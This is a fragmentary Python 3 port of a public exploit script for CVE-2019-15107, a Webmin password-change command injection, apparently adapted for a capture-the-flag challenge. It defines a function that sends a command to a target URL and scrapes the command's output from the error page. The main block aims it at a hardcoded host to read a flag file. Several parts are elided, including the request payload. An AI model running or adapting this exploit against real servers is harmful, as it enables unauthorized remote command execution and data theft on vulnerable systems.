# Original work here https://github.com/jas502n/CVE-2019-15107/blob/master/CVE_2019_15107.py
# Edited to work with Python3 (print, bytes)
# Remember to not put a trailing slash in the URL, it might break the world.
import requests
import re
...
def CVE_2019_15107(url, cmd):
    ...
    if r.status_code ==200 and b"The current password is " in r.content :
        print("\nvuln_url= %s" % vuln_url)
        m = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
        cmd_result = m.findall(r.content.decode("utf-8"))[0]
...
if __name__ == "__main__":
    ...
    url = "https://secure-management.wep.dk"
    # url = sys.argv[1]
    cmd = "cat /flag-with-unguessable-name.txt"
